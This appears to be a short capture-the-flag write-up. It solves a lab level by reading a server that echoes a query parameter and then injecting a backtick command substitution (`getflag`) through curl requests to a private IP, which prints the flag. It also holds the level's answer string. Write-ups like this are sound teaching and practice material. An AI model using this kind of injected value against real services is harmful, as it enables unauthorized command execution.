HINT:
we notice there is a server running on localhost:4747, now all we have to do is read what the code does and exploit it

ANSWER:
by reading the code we notice that the server is running on localhost:4747, we also notice that it will print the parameter "x" it receives, let's try:
curl 'http://192.168.157.130:4747/?x=uwu'
now we do:
curl 'http://192.168.157.130:4747/?x=getflag'
and it just prints getflag, we need to add ` to make our command start before the echo (https://unix.stackexchange.com/questions/27428/what-does-backquote-backtick-mean-in-commands) so we do:
curl 'http://192.168.157.130:4747/?x=`getflag`'
and we get:
ne2searoevaevoem4ov4ar8ap